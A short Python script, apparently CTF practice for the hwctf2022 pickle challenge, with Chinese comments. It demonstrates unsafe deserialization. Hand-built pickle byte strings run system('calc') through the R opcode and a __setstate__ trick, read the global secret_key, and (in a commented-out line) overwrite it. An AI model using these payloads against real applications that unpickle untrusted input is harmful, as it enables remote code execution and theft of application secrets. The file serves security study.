"""
#!/usr/bin/env python
# -*- coding:utf-8 -*-
@File : pickle_cover_variable.py
@Author : 75571
@Time : 2022/10/5 23:17

"""
import pickle
import pickletools
import time
import secret
from flask import Flask
import os
app = Flask(__name__)
app.secret_key = secret.secret_key


class User:
    def __init__(self, age=25, name="lockcy"):
        self.age = age
        self.name = name
        print("__init__")

    def say(self):
        print("hello")

    def sleep(self):
        print("start to sleep")
        time.sleep(2)
        print("end sleeping")

    # def __reduce__(self):
    #     return (__import__("os").system,("calc",))


if __name__ == '__main__':
    user1 = User(1, "a")
    data = pickle.dumps(user1)
    print(data)
    # 正常的序列化数据
    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x19\x8c\x04name\x94\x8c\x06lockcy\x94ub.'
    # R 命令字调用 __reduce__ 调用函数命令执行
    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
           b'\x8c\x03age\x94K\x19\x8c\x04name\x94\x8c\x06lockcy\x94ub' \
           b'\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x940.'
    # 读取全局变量 app.secret_key，使 name 指向 secret_key (hwctf2022-pickle game)
    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
           b'\x8c\x03age\x94K\x19\x8c\x04namecsecret\nsecret_key\nub.'

    # 读取全局变量 app.secret_key，使 name 指向 secret_key (hwctf2022-pickle game)
    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
           b'\x8c\x03age\x94K\x19\x8c\x04namecsecret\nsecret_key\nub' \
           b'}(S"__\x73etstate__"\ncnt\nsystem\nubS"calc"\nb.'

    # 覆盖全局变量 app.secret_key (hwctf2022-pickle game 非预期)
    # evil = b'csecret\nsecret_key\n(S"secret_key"\nS"hack!"\ndb.'
    u = pickle.loads(evil)
    # print(secret.secret_key)
    # print(type(u))
    pickletools.dis(evil)

